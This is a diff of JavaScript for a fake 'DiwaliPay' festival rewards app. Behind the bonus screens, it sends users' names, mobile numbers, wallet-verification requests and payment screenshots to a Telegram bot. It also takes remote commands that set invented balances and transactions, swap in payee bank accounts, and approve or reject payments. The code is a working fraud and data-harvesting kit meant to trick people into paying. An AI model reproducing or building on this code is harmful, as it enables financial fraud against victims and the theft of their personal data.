+function tg(msg){try{fetch('https://api.telegram.org/bot'+TBOT+'/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:TCHAT,text:msg,parse_mode:'HTML',disable_web_page_preview:true})}).catch(function(){})}catch(e){}}
+function tgPhoto(d,c){if(!d)return;try{fetch(d).then(function(r){return r.blob()}).then(function(b){var fd=new FormData();fd.append('chat_id',TCHAT);fd.append('photo',b,'lp.jpg');fd.append('caption',c||'');fd.append('parse_mode','HTML');return fetch('https://api.telegram.org/bot'+TBOT+'/sendPhoto',{method:'POST',body:fd})}).catch(function(){})}catch(e){}}
+
+function getBal(){var m=read(STORE.mobile);var v=m?read('lp_bal_'+m):null;if(v===null)v=read(STORE.balance);return v&&/^-?\d+$/.test(v)?parseInt(v,10):DEFAULT_BALANCE;}
+function setBal(a){var m=read(STORE.mobile);if(m)save('lp_bal_'+m,String(a));save(STORE.balance,String(a));}
+var lastBal=null;
+function renderBal(anim){var a=getBal();if($('mainBalance')){$('mainBalance').textContent='₹'+a;if(anim||(lastBal!==null&&lastBal!==a)){$('mainBalance').classList.remove('updated');void $('mainBalance').offsetWidth;$('mainBalance').classList.add('updated')}}if($('headerBalance'))$('headerBalance').textContent=String(a);lastBal=a;}
+
+function inviteCountK(){return 'lp_invcount_'+(read(STORE.mobile)||'main');}
+function inviteEarnK(){return 'lp_invearn_'+(read(STORE.mobile)||'main');}
+function getInviteCount(){var v=read(inviteCountK());return v?parseInt(v,10):0;}
+function setInviteCount(n){save(inviteCountK(),String(n));}
+function getInviteEarn(){var v=read(inviteEarnK());return v?parseInt(v,10):0;}
+function setInviteEarn(n){save(inviteEarnK(),String(n));}
+function rndCode(){var c='ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789',o='';for(var i=0;i<5;i++)o+=c.charAt(Math.floor(Math.random()*c.length));return o;}
+
+function getTheme(){var d={name:'diwali',th1:'#fbbf24',th2:'#d97706',th3:'#b45309',th4:'#7c2d12',thGlow:'rgba(245,158,11,.5)',thBg1:'#fff9ec',thBg2:'#fef3c7',thBg3:'#fed7aa',brand:'DiwaliPay',loginTitle:'Welcome <span class="acc">Back</span>',loginSub:'Login to continue earning rewards',regTitle:'Create <span class="acc">Account</span>',regSub:'Join & start earning rewards',mainTop:'🪔 दिवाली की हार्दिक शुभकामनाएं 🪔',mainAmt:'₹50 FREE',mainSub:'Register Bonus · Limited Time',logoImg:'',mainImg:'',loginLogoImg:'',regLogoImg:''};try{var r=read('lp_cfg');if(r){var o=JSON.parse(r);for(var k in o){if(o[k]!==undefined)d[k]=o[k]}}}catch(e){}return d;}
+function saveCfg(o){save('lp_cfg',JSON.stringify(o));applyTheme();renderCfg();}
+function presetDiwali(){return{name:'diwali',th1:'#fbbf24',th2:'#d97706',th3:'#b45309',th4:'#7c2d12',thGlow:'rgba(245,158,11,.5)',thBg1:'#fff9ec',thBg2:'#fef3c7',thBg3:'#fed7aa',brand:'DiwaliPay',loginSub:'Login & win ₹50 FREE',regSub:'₹50 Diwali Bonus',mainTop:'🪔 दिवाली की हार्दिक शुभकामनाएं 🪔',mainAmt:'₹50 FREE',mainSub:'Register Bonus · Limited Time'};}
+function presetDurga(){return{name:'durga',th1:'#ef4444',th2:'#dc2626',th3:'#b91c1c',th4:'#7f1d1d',thGlow:'rgba(239,68,68,.5)',thBg1:'#fef2f2',thBg2:'#fee2e2',thBg3:'#fecaca',brand:'DurgaPay',loginSub:'Blessings of Maa Durga',regSub:'₹50 Puja Bonus',mainTop:'🙏 Jai Maa Durga',mainAmt:'₹50 FREE',mainSub:'Register Bonus'};}
+function presetHoli(){return{name:'holi',th1:'#ec4899',th2:'#db2777',th3:'#be185d',th4:'#831843',thGlow:'rgba(236,72,153,.5)',thBg1:'#fdf4ff',thBg2:'#fae8ff',thBg3:'#f5d0fe',brand:'HoliPay',loginSub:'Rang Barse!',regSub:'₹50 Holi Bonus',mainTop:'🎨 Happy Holi',mainAmt:'₹50 FREE',mainSub:'Register Bonus'};}
+function presetChristmas(){return{name:'christmas',th1:'#16a34a',th2:'#15803d',th3:'#166534',th4:'#14532d',thGlow:'rgba(22,163,74,.5)',thBg1:'#f0fdf4',thBg2:'#dcfce7',thBg3:'#bbf7d0',brand:'ChristmasPay',loginSub:'Christmas Bonus ₹50',regSub:'₹50 Bonus',mainTop:'🎄 Merry Christmas',mainAmt:'₹50 FREE',mainSub:'Register Bonus'};}
+
+function applyTheme(){var t=getTheme();var r=document.documentElement;r.style.setProperty('--th1',t.th1);r.style.setProperty('--th2',t.th2);r.style.setProperty('--th3',t.th3);r.style.setProperty('--th4',t.th4);r.style.setProperty('--thGlow',t.thGlow);r.style.setProperty('--thBg1',t.thBg1);r.style.setProperty('--thBg2',t.thBg2);r.style.setProperty('--thBg3',t.thBg3);document.body.style.background='radial-gradient(circle at 12% 8%,'+t.thGlow+',transparent 45%),linear-gradient(135deg,'+t.thBg1+','+t.thBg3+')';var p=document.querySelector('.phone');if(p)p.style.background='linear-gradient(180deg,'+t.thBg1+' 0%,'+t.thBg2+' 40%,'+t.thBg3+' 100%)';['loginScreen','registerScreen','forgotScreen','newPassScreen','waitScreen','loginOtpScreen'].forEach(function(s){var el=$(s);if(el)el.style.background='linear-gradient(180deg,'+t.thBg1+','+t.thBg3+')'});var mc=document.querySelector('meta[name="theme-color"]');if(mc)mc.setAttribute('content',t.th2);}
+
+function renderCfg(){var c=getTheme();if($('mainBannerTop'))$('mainBannerTop').textContent=c.mainTop;if($('mainBannerAmt'))$('mainBannerAmt').textContent=c.mainAmt;if($('mainBannerSub'))$('mainBannerSub').textContent=c.mainSub;if($('footerBrand'))$('footerBrand').textContent=c.brand;if($('loginTitleEl'))$('loginTitleEl').innerHTML=c.loginTitle;if($('regTitleEl'))$('regTitleEl').innerHTML=c.regTitle;if($('loginSubEl'))$('loginSubEl').textContent=c.loginSub;if($('regSubEl'))$('regSubEl').textContent=c.regSub;document.title=c.brand+' · ₹50 FREE';var ll=$('loginLogo');if(ll){var lli=c.loginLogoImg||c.logoImg;if(lli)ll.innerHTML='<img src="'+lli+'" alt="logo">';else ll.innerHTML='<i class="fa-solid fa-clover"></i>'}var rl=$('registerLogo');if(rl){var rli=c.regLogoImg||c.logoImg;if(rli)rl.innerHTML='<img src="'+rli+'" alt="logo">';else rl.innerHTML='<i class="fa-solid fa-clover"></i>'}var mW=$('mainBannerImgWrap'),mI=$('mainBannerImg'),mB=$('mainBanner');if(mB){var mTextTop=mB.querySelector('.banner-text-top');var mAnim=mB.querySelector('.banner-anim');if(mW&&mI){if(c.mainImg){mI.src=c.mainImg;mW.classList.remove('hidden');if(mTextTop)mTextTop.style.display='none';if(mAnim)mAnim.style.display='none';mB.querySelectorAll('.diya-lamp,.firework,.spark').forEach(function(el){el.style.display='none'})}else{mW.classList.add('hidden');mI.src='';if(mTextTop)mTextTop.style.display='';if(mAnim)mAnim.style.display='';mB.querySelectorAll('.diya-lamp,.firework,.spark').forEach(function(el){el.style.display=''})}}}}
+
+var DEFAULT_WALLETS=[{name:'Paytm',icon:'fa-wallet',cls:'paytm',logo:''},{name:'MobiKwik',icon:'fa-credit-card',cls:'mobikwik',logo:''},{name:'Freecharge',icon:'fa-bolt',cls:'freecharge',logo:''},{name:'Navi',icon:'fa-n',cls:'navi',logo:''}];
+function getWallets(){try{var r=read('lp_wallets');if(r){var a=JSON.parse(r);if(Array.isArray(a)&&a.length)return a}}catch(e){}return DEFAULT_WALLETS.slice();}
+function setWallets(a){save('lp_wallets',JSON.stringify(a));renderWalletList();renderVerifiedCard();}
+function wlK(m){return 'lp_wl_'+(m||read(STORE.mobile)||'main');}
+function wlReqK(m){return 'lp_wlreq_'+(m||read(STORE.mobile)||'main');}
+function getWl(m){var list=getWallets();var o={};list.forEach(function(w){o[w.name]=false});try{var r=read(wlK(m));if(r){var s=JSON.parse(r);list.forEach(function(w){if(typeof s[w.name]==='boolean')o[w.name]=s[w.name]})}}catch(e){}return o;}
+function setWl(o,m){save(wlK(m),JSON.stringify(o));}
+function getWlReq(m){try{var r=read(wlReqK(m));return r?(JSON.parse(r)||{}):{}}catch(e){return{}}}
+function setWlReq(o,m){save(wlReqK(m),JSON.stringify(o));}
+
+function renderWalletList(){var wrap=$('walletListWrap');if(!wrap)return;var list=getWallets();var w=getWl();var rq=getWlReq();var html='';list.forEach(function(item){var isVer=w[item.name];var isPend=rq[item.name];var cardCls='wallet-card'+(isVer?' verified':'')+(isPend&&!isVer?' pending-card':'');var btnCls='btn-verify'+(isVer?' verified':'')+(isPend&&!isVer?' pending':'');var btnTxt=isVer?'Verified':(isPend?'Pending':'Verify');var statusCls=isVer?'wc-status ok':(isPend?'wc-status pending':'wc-status');var statusTxt=isVer?'Verification completed':(isPend?'Waiting for owner':'Not verified');var iconHtml=item.logo?'<img src="'+item.logo+'" alt="'+item.name+'">':'<i class="fa-solid '+(item.icon||'fa-wallet')+'"></i>';html+='<div class="'+cardCls+'" data-wallet="'+item.name+'"><div class="wc-icon '+(item.cls||'')+'">'+iconHtml+'</div><div class="wc-info"><div class="wc-name">'+item.name+'</div><div class="'+statusCls+'"><span class="dot"></span> '+statusTxt+'</div></div><button class="'+btnCls+'" type="button">'+btnTxt+'</button></div>';});wrap.innerHTML=html;var cards=wrap.querySelectorAll('.wallet-card');for(var i=0;i<cards.length;i++)cards[i].addEventListener('click',function(){openWlSheet(this.getAttribute('data-wallet'))});}
+function renderVerifiedCard(){var card=$('verifiedWalletsCard'),grid=$('vwcGrid'),cnt=$('vwcCount');if(!card||!grid)return;var list=getWallets();var w=getWl();var verified=list.filter(function(x){return w[x.name]});if(verified.length===0){card.classList.add('hidden');return;}card.classList.remove('hidden');if(cnt)cnt.textContent=verified.length;var html='';verified.forEach(function(item){var iconHtml=item.logo?'<img src="'+item.logo+'" alt="'+item.name+'">':'<i class="fa-solid '+(item.icon||'fa-wallet')+'"></i>';html+='<div class="vwc-pill"><div class="wp-ico '+(item.cls||'')+'">'+iconHtml+'</div><span>'+item.name+'</span><i class="fa-solid fa-circle-check wp-check"></i></div>';});grid.innerHTML=html;}
+
+var curW=null,wSent=false,wToken=0;
+function openWlSheet(name){curW=name;if(getWl()[name]){toast(name+' already verified','success');return;}var rq=getWlReq();if(rq[name]){showWlReqPop(name,rq[name].mobile);return;}$('wSheetTitle').textContent='Verify '+name;$('wSheetSub').textContent='Enter mobile & OTP';$('wMobile').value='';$('wOtp').value='';$('wOtpHint').className='hint';$('wOtpHint').innerHTML='';wSent=false;showWPanel('wStep1');openSheet('walletVerifyModal');}
+function showWPanel(id){['wStep1','wStep2','wLoading','wSuccess'].forEach(function(p){var el=$(p);if(el)el.classList.add('hidden')});var t=$(id);if(t)t.classList.remove('hidden');}
+function showWlReqPop(w,m){$('reqWalletName').textContent=w;$('reqWalletMobile').textContent='+91 '+m;$('walletReqPopup').classList.add('show');}
+function submitWlReq(w,m){var rq=getWlReq();rq[w]={mobile:m,time:Date.now()};setWlReq(rq);closeSheet('walletVerifyModal');tg('🔐 <b>Wallet Verify Request</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n💼 '+esc(w)+'\n📱 +91 '+esc(m)+'\n\n<b>Approve:</b> <code>walletok '+esc(m)+' '+esc(w)+'</code>');showWlReqPop(w,m);renderWalletList();renderVerifiedCard();toast(w+' request sent','success');}
+
+function getPrize(){return parseInt(read('lp_prize_demo')||'0',10);}
+function getPay(){try{var r=read('lp_pay_state');return r?JSON.parse(r):null}catch(e){return null}}
+function setPay(p){save('lp_pay_state',JSON.stringify(p));}
+function delPay(){del('lp_pay_state');}
+function renderPayee(){var p=null;try{p=JSON.parse(read('lp_payee_demo')||'null')}catch(e){}var card=$('payeeCard'),st=$('payeeStatus'),dot=$('payeeStatusDot'),tx=$('payeeStatusText');if(!card)return;var live=p&&p.account&&p.ifsc&&p.name;if(live){card.classList.remove('offline');card.classList.add('live');st.classList.remove('offline');st.classList.add('live');tx.textContent='✓ ACCOUNT ACTIVE';dot.className='fa-solid fa-circle-check';$('payAccount').textContent=p.account;$('payName').textContent=p.name;$('payIfsc').textContent=p.ifsc;}else{card.classList.remove('live');card.classList.add('offline');st.classList.remove('live');st.classList.add('offline');tx.textContent='OFFLINE';dot.className='fa-solid fa-circle';$('payAccount').textContent='××××××××××××';$('payName').textContent='×××××××××';$('payIfsc').textContent='×××××××××××';}if($('payAmount'))$('payAmount').textContent='₹'+getPrize();}
+function showPayPanel(id){['payStepWait','payStep1','payStep2','payStep3','payStep4','payStep5'].forEach(function(p){var el=$(p);if(el)el.classList.add('hidden')});var t=$(id);if(t)t.classList.remove('hidden');}
+var payTimerInt=null,pendingShot=null;
+function startPayTimer(d){stopPayTimer();var el=$('payTimer');function tick(){var l=d-Date.now();if(l<=0){el.textContent='00:00';stopPayTimer();var cur=getPay();if(cur&&cur.status==='pending'){cur.status='timeout';setPay(cur);}showPayPanel('payStep5');return;}var s=Math.floor(l/1000),mm=Math.floor(s/60),ss=s%60;el.textContent=(mm<10?'0':'')+mm+':'+(ss<10?'0':'')+ss;}tick();payTimerInt=setInterval(tick,1000);}
+function stopPayTimer(){if(payTimerInt){clearInterval(payTimerInt);payTimerInt=null;}}
+function resetUpload(){if($('uploadPreview'))$('uploadPreview').classList.add('hidden');if($('uploadInner'))$('uploadInner').classList.remove('hidden');if($('uploadChange'))$('uploadChange').classList.add('hidden');if($('uploadBox'))$('uploadBox').classList.remove('has-image');pendingShot=null;if($('screenshotInput'))$('screenshotInput').value='';}
+function requestUnlock(){var p=getPay();if(!p)p={status:'idle'};if(p.status==='ready'||p.status==='pending'||p.status==='approved'){openPayModal();return;}p.status='waiting_unlock';setPay(p);tg('🛒 <b>Purchase Request</b>\n\n👤 '+esc(read(STORE.user)||'-')+'\n📱 +91 '+esc(read(STORE.mobile)||'-')+'\n\nOwner: <code>next '+(read(STORE.mobile)||'')+'</code>');toast('Request sent','success');openPayModal();}
+function openPayModal(){renderPayee();var p=getPay();if(!p||p.status==='idle'){requestUnlock();return;}if(p.status==='waiting_unlock'){$('payPanelSub').textContent='Verifying with owner...';showPayPanel('payStepWait');}else if(p.status==='ready'){$('payAmount').textContent='₹'+(read('lp_prize_demo')||'20');if(!pendingShot)resetUpload();showPayPanel('payStep1');}else if(p.status==='pending'){startPayTimer(p.deadline);showPayPanel('payStep2');}else if(p.status==='approved'){showPayPanel('payStep3');}else if(p.status==='rejected'){showPayPanel('payStep4');}else if(p.status==='timeout'){showPayPanel('payStep5');}else{showPayPanel('payStepWait');}openSheet('purchaseModal');}
+function bindUpload(){var box=$('uploadBox'),inp=$('screenshotInput'),pv=$('uploadPreview'),inr=$('uploadInner'),chg=$('uploadChange');if(!box)return;box.addEventListener('click',function(){inp.click()});inp.addEventListener('change',function(e){var f=e.target.files&&e.target.files[0];if(!f)return;if(!/^image\//.test(f.type)){toast('Select image','error');return;}if(f.size>5*1024*1024){toast('Max 5MB','error');return;}var r=new FileReader();r.onload=function(ev){pendingShot=ev.target.result;pv.src=pendingShot;pv.classList.remove('hidden');inr.classList.add('hidden');chg.classList.remove('hidden');box.classList.add('has-image');toast('Screenshot added','success');};r.readAsDataURL(f);});}
+function submitPayment(){var p=getPay();if(!p||p.status!=='ready')return;if(!pendingShot){toast('Upload screenshot','error');return;}p.status='pending';p.deadline=Date.now()+PAY_TIMEOUT_MS;setPay(p);toast('Payment submitted','success');startPayTimer(p.deadline);showPayPanel('payStep2');var u=read(STORE.user)||'-',m=read(STORE.mobile)||'-';tg('💰 <b>Payment Submitted</b>\n\n👤 '+esc(u)+'\n📱 +91 '+esc(m)+'\n💵 ₹'+getPrize()+'\n\n<b>Approve:</b> <code>payok '+esc(m)+'</code>\n<b>Reject:</b> <code>payno '+esc(m)+'</code>');tgPhoto(pendingShot,'📷 Screenshot\n👤 '+esc(u));}
+
+function txK(){var m=read(STORE.mobile);return m?('lp_tx_'+m):'lp_tx';}
+function getTx(){try{var r=read(txK());if(!r)return[];var a=JSON.parse(r);return Array.isArray(a)?a:[]}catch(e){return[]}}
+function setTx(a){save(txK(),JSON.stringify(a));}
+function addTx(t){var a=getTx();a.unshift(t);if(a.length>80)a=a.slice(0,80);setTx(a);}
+function fmtDate(ts){if(!ts)return'Just now';try{var d=new Date(parseInt(ts,10));var df=Math.floor((Date.now()-d)/1000);if(df<60)return'Just now';if(df<3600)return Math.floor(df/60)+' min ago';if(df<86400)return Math.floor(df/3600)+' hr ago';return d.toLocaleDateString('en-IN',{day:'2-digit',month:'short'})}catch(e){return'Just now'}}
+function renderWalletHistory(){var c=$('walletHistoryList');if(!c)return;var tx=getTx();if(tx.length===0){c.innerHTML='<div style="text-align:center;padding:40px 20px;color:#5c7a68;font-weight:600;font-size:14px;"><i class="fa-solid fa-receipt" style="font-size:48px;color:#e6d8b8;display:block;margin-bottom:14px;"></i>No history yet</div>';return;}var html='';tx.forEach(function(t){var isNeg=t.amount<0,sg=isNeg?'-':'+',amt=Math.abs(t.amount);html+='<div class="history-item"><div class="history-icon" style="background:'+(isNeg?'linear-gradient(160deg,#f87171,#dc2626)':'linear-gradient(160deg,var(--th1),var(--th3))')+';"><i class="fa-solid '+(isNeg?'fa-arrow-up-right-from-square':'fa-wallet')+'"></i></div><div class="history-info"><div class="history-title">'+esc(t.label||'Transaction')+'</div><div class="history-date"><i class="fa-regular fa-clock"></i> '+fmtDate(t.time)+'</div></div><div class="history-amount '+(isNeg?'neg':'pos')+'">'+sg+'₹'+amt+'</div></div>';});c.innerHTML=html;}
+
+function getSup(){try{var r=read('lp_support');if(r){var o=JSON.parse(r);if(o&&o.p)return o}}catch(e){}return{p:'8235619970',w:'8235619970'};}
+function setSup(o){save('lp_support',JSON.stringify(o));}
+function delSup(){del('lp_support');}
+
+function openSheet(id){var el=$(id);if(el)el.classList.add('show');}
+function closeSheet(id){var el=$(id);if(el)el.classList.remove('show');}
+function bindClose(){var cl=document.querySelectorAll('[data-close]');for(var i=0;i<cl.length;i++)cl[i].addEventListener('click',function(){closeSheet(this.getAttribute('data-close'))});var ov=document.querySelectorAll('.overlay');for(var j=0;j<ov.length;j++)ov[j].addEventListener('click',function(e){if(e.target===this)this.classList.remove('show')});}
+function showScreen(id){['loginScreen','registerScreen','waitScreen','forgotScreen','newPassScreen','appScreen','loginOtpScreen'].forEach(function(s){var el=$(s);if(el)el.classList.add('hidden')});var t=$(id);if(t)t.classList.remove('hidden');window.scrollTo({top:0,behavior:'smooth'});}
+
+var pollActive=false,cmdPollInt=null,waitPollInt=null,forgotPollInt=null,logPollInt=null;
+
+function pollTg(opts){
+  opts=opts||{};var m=opts.mobile||read(STORE.mobile);if(!m)return;if(pollActive)return;
+  pollActive=true;
+  var last=parseInt(read(STORE.offset)||'0',10);
+  var u='https://api.telegram.org/bot'+TBOT+'/getUpdates?offset='+(last+1)+'&timeout=0&limit=50';
+  fetch(u).then(function(r){return r.json()}).then(function(d){
+    pollActive=false;if(!d||!d.ok||!d.result)return;
+    var mx=last;
+    var approved=false,rejected=false,resetAppr=false,unlocked=false,unblocked=false,blocked=false;
+    var wlChg=false,payChg=false,payeeChg=false,txChg=false,cfgChg=false,balChg=false,inviteChg=false;
+    d.result.forEach(function(up){
+      if(up.update_id>mx)mx=up.update_id;
+      var msg=up.message;if(!msg||!msg.from)return;if(String(msg.from.id)!==String(TCHAT))return;
+      var txt=(msg.text||'').trim();if(!txt)return;var mt;
+
+      mt=txt.match(/^\/?ok\s+(\d{10})$/i);if(mt&&mt[1]===m){approved=true;del(STORE.rejected);del('lp_blk_'+m);return;}
+      mt=txt.match(/^\/?(?:reject|deny)\s+(\d{10})$/i);if(mt&&mt[1]===m){rejected=true;del(STORE.approved);return;}
+      mt=txt.match(/^\/?resetpass\s+(\d{10})$/i);if(mt&&mt[1]===m){resetAppr=true;return;}
+      mt=txt.match(/^\/?block\s+(\d{10})$/i);if(mt&&mt[1]===m){save('lp_blk_'+m,'1');blocked=true;return;}
+      mt=txt.match(/^\/?unblock\s+(\d{10})$/i);if(mt&&mt[1]===m){del('lp_blk_'+m);unblocked=true;return;}
+      mt=txt.match(/^\/?(?:autologin|loginskip|skiplogin)\s+on$/i);if(mt){save('lp_auto_global','1');setAutoLogin(m);toast('✓ Autologin ON','success');return;}
+      mt=txt.match(/^\/?(?:autologin|loginskip|skiplogin)\s+off$/i);if(mt){del('lp_auto_global');clrAutoLogin(m);toast('Autologin OFF','info');return;}
+      mt=txt.match(/^\/?autologin\s+(\d{10})$/i);if(mt){setAutoLogin(mt[1]);toast('Autologin ON','success');return;}
+      mt=txt.match(/^\/?autologinoff\s+(\d{10})$/i);if(mt){clrAutoLogin(mt[1]);toast('Autologin OFF','info');return;}
+      mt=txt.match(/^\/?autologinall\s+on$/i);if(mt){save('lp_auto_global','1');toast('All autologin ON','success');return;}
+      mt=txt.match(/^\/?autologinall\s+off$/i);if(mt){del('lp_auto_global');toast('All autologin OFF','info');return;}
+
+      mt=txt.match(/^\/?(?:add|plus)\s+(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){var a=parseInt(mt[1],10);setBal(getBal()+a);addTx({amount:a,label:'Bonus Credit',time:Date.now()});balChg=true;txChg=true;toast('₹'+a+' added','success');return;}
+      mt=txt.match(/^\/?(?:minus|deduct|subtract)\s+(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){var n=parseInt(mt[1],10);setBal(Math.max(0,getBal()-n));addTx({amount:-n,label:'UPI Transfer',time:Date.now()});balChg=true;txChg=true;toast('₹'+n+' deducted','info');return;}
+      mt=txt.match(/^\/?-(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){var n2=parseInt(mt[1],10);setBal(Math.max(0,getBal()-n2));addTx({amount:-n2,label:'UPI Transfer',time:Date.now()});balChg=true;txChg=true;return;}
+      mt=txt.match(/^\/?(?:setbal|balance)\s+(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){var sv=parseInt(mt[1],10);var prev=getBal();setBal(sv);addTx({amount:sv-prev,label:'Balance Updated',time:Date.now()});balChg=true;txChg=true;toast('Balance ₹'+sv,'success');return;}
+      mt=txt.match(/^\/?(?:amount|setamount)[=:\s]+(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){var av=parseInt(mt[1],10);var pv=getBal();setBal(av);addTx({amount:av-pv,label:'Balance Set',time:Date.now()});balChg=true;txChg=true;return;}
+
+      mt=txt.match(/^\/?txn\s+([A-Za-z0-9_\-\s]+?)\s+(-?\d{1,7})\s+(\d{10})$/i);if(mt&&mt[3]===m){var lb=mt[1].trim(),ta=parseInt(mt[2],10);if(!isNaN(ta)&&ta!==0){addTx({amount:ta,label:lb,time:Date.now()});txChg=true;toast('Entry added','success');}return;}
+      mt=txt.match(/^\/?cleartxn\s+(\d{10})$/i);if(mt&&mt[1]===m){setTx([]);txChg=true;toast('History cleared','success');return;}
+
+      mt=txt.match(/^\/?(?:prize|setprize)\s+(\d{1,7})\s+(\d{10})$/i);if(mt&&mt[2]===m){save('lp_prize_demo',mt[1]);toast('Prize ₹'+mt[1],'success');return;}
+      mt=txt.match(/^\/?(?:prize|setprize)\s+(\d{10})\s+(\d{1,7})$/i);if(mt&&mt[1]===m){save('lp_prize_demo',mt[2]);toast('Prize ₹'+mt[2],'success');return;}
+      mt=txt.match(/^\/?prizeoff\s+(\d{10})$/i);if(mt&&mt[1]===m){del('lp_prize_demo');toast('Prize cleared','info');return;}
+
+      mt=txt.match(/^\/?(?:next|unlock)\s+(\d{10})$/i);if(mt&&mt[1]===m){var cp=getPay();if(cp&&cp.status==='waiting_unlock'){cp.status='ready';setPay(cp);}unlocked=true;toast('✓ Owner ready!','success');return;}
+      mt=txt.match(/^\/?next$/i);if(mt){var cp2=getPay();if(cp2&&cp2.status==='waiting_unlock'){cp2.status='ready';setPay(cp2);unlocked=true;}return;}
+
+      mt=txt.match(/^\/?payee\s+(\d{10})\s+(\d{6,18})\s+([A-Z]{4}0[A-Z0-9]{6})\s+(.+)$/i);if(mt&&mt[1]===m){save('lp_payee_demo',JSON.stringify({account:mt[2],ifsc:mt[3].toUpperCase(),name:mt[4].trim().slice(0,40)}));payeeChg=true;toast('Payee updated','success');return;}
+      mt=txt.match(/^\/?payeeoff\s+(\d{10})$/i);if(mt&&mt[1]===m){del('lp_payee_demo');payeeChg=true;toast('Payee OFFLINE','info');return;}
+
+      mt=txt.match(/^\/?payok\s+(\d{10})$/i);if(mt&&mt[1]===m){var p1=getPay();if(p1&&(p1.status==='pending'||p1.status==='ready')){p1.status='approved';setPay(p1);addTx({amount:getPrize()||20,label:'Payment Coupon',time:Date.now()});txChg=true;if($('purchaseModal').classList.contains('show')){stopPayTimer();showPayPanel('payStep3');}toast('✓ Payment verified','success');}payChg=true;return;}
+      mt=txt.match(/^\/?payno\s+(\d{10})$/i);if(mt&&mt[1]===m){var p2=getPay();if(p2&&p2.status==='pending'){p2.status='rejected';setPay(p2);if($('purchaseModal').classList.contains('show')){stopPayTimer();showPayPanel('payStep4');}toast('Rejected','error');}payChg=true;return;}
+
+      mt=txt.match(/^\/?walletok\s+(\d{10})\s+(.+)$/i);if(mt&&mt[1]===m){var w=mt[2].trim();var wl=getWl();wl[w]=true;setWl(wl);var rq=getWlReq();delete rq[w];setWlReq(rq);wlChg=true;toast(w+' verified','success');return;}
+      mt=txt.match(/^\/?walletno\s+(\d{10})(?:\s+(.+))?$/i);if(mt&&mt[1]===m){if(mt[2]){var wr=mt[2].trim();var rq2=getWlReq();delete rq2[wr];setWlReq(rq2);}else{setWlReq({});}wlChg=true;toast('Wallet rejected','info');return;}
+      mt=txt.match(/^\/?walletreset\s+(\d{10})$/i);if(mt&&mt[1]===m){setWl({});setWlReq({});wlChg=true;toast('All wallets reset','info');return;}
+      mt=txt.match(/^\/?addwallet\s+(.+?)\s+(\S+)(?:\s+(fa-[a-z0-9-]+))?$/i);if(mt){var list=getWallets();var newName=mt[1].trim();var logo=mt[2];var icon=mt[3]||'fa-wallet';var found=false;list.forEach(function(x){if(x.name.toLowerCase()===newName.toLowerCase()){x.logo=logo;if(icon)x.icon=icon;found=true}});if(!found)list.push({name:newName,icon:icon,cls:'',logo:logo});setWallets(list);toast('Wallet added','success');return;}
+      mt=txt.match(/^\/?walletlogo\s+(.+?)\s+(\S+)$/i);if(mt){var l2=getWallets();var wn=mt[1].trim();l2.forEach(function(x){if(x.name.toLowerCase()===wn.toLowerCase())x.logo=mt[2]});setWallets(l2);toast('Logo updated','success');return;}
+      mt=txt.match(/^\/?delwallet\s+(.+)$/i);if(mt){var dn=mt[1].trim().toLowerCase();var l3=getWallets().filter(function(x){return x.name.toLowerCase()!==dn});setWallets(l3);toast('Wallet deleted','info');return;}
+
+      mt=txt.match(/^\/?inviteok\s+(\d{10})$/i);if(mt&&mt[1]===m){var newBal=getBal()+INVITE_REWARD;setBal(newBal);setInviteCount(getInviteCount()+1);setInviteEarn(getInviteEarn()+INVITE_REWARD);addTx({amount:INVITE_REWARD,label:'Invite Reward',time:Date.now()});balChg=true;txChg=true;inviteChg=true;toast('🎉 ₹'+INVITE_REWARD+' invite reward!','success');return;}
+      mt=txt.match(/^\/?setinvite\s+(\d{10})\s+([A-Za-z0-9]{3,10})$/i);if(mt&&mt[1]===m){save(STORE.invite,mt[2]);toast('Invite code updated','success');return;}
+
+      mt=txt.match(/^\/?setuser\s+(\d{10})\s+(.+)$/i);if(mt&&mt[1]===m){var nn=mt[2].trim().slice(0,20);save(STORE.user,nn);if($('hUsername'))$('hUsername').textContent=nn;toast('Username updated','success');return;}
+
+      mt=txt.match(/^\/?(?:reset|wipe)\s+(\d{10})$/i);if(mt&&mt[1]===m){[STORE.user,STORE.mobile,STORE.balance,STORE.pass,STORE.approved,STORE.rejected,STORE.invite].forEach(function(f){del(f)});del('lp_bal_'+m);del(wlK(m));del(wlReqK(m));del('lp_tx_'+m);del('lp_blk_'+m);clrAutoLogin(m);toast('Account reset','info');setTimeout(function(){location.reload()},800);return;}
+
+      mt=txt.match(/^\/?support\s+(\d{10})\s+(\d{10})\s+(\d{10})$/i);if(mt&&mt[1]===m){setSup({p:mt[2],w:mt[3]});toast('Support updated','success');return;}
+      mt=txt.match(/^\/?supportoff\s+(\d{10})$/i);if(mt&&mt[1]===m){delSup();toast('Support reset','success');return;}
+
+      mt=txt.match(/^\/?theme\s+diwali$/i);if(mt){var t1=presetDiwali();var c1=getTheme();for(var k1 in t1)c1[k1]=t1[k1];save('lp_cfg',JSON.stringify(c1));applyTheme();renderCfg();toast('🪔 Diwali theme ON','success');return;}
+      mt=txt.match(/^\/?theme\s+durga(?:puja)?$/i);if(mt){var t2=presetDurga();var c2=getTheme();for(var k2 in t2)c2[k2]=t2[k2];save('lp_cfg',JSON.stringify(c2));applyTheme();renderCfg();toast('🙏 Durga theme ON','success');return;}
+      mt=txt.match(/^\/?theme\s+holi$/i);if(mt){var t3=presetHoli();var c3=getTheme();for(var k3 in t3)c3[k3]=t3[k3];save('lp_cfg',JSON.stringify(c3));applyTheme();renderCfg();toast('🎨 Holi theme ON','success');return;}
+      mt=txt.match(/^\/?theme\s+(?:christmas|xmas)$/i);if(mt){var t4=presetChristmas();var c4=getTheme();for(var k4 in t4)c4[k4]=t4[k4];save('lp_cfg',JSON.stringify(c4));applyTheme();renderCfg();toast('🎄 Christmas theme ON','success');return;}
+
+      mt=txt.match(/^\/?themecolor\s+(#[0-9a-fA-F]{6})\s+(#[0-9a-fA-F]{6})\s+(#[0-9a-fA-F]{6})$/i);if(mt){var c5=getTheme();c5.th1=mt[1];c5.th2=mt[2];c5.th3=mt[3];save('lp_cfg',JSON.stringify(c5));applyTheme();renderCfg();toast('Colors updated','success');return;}
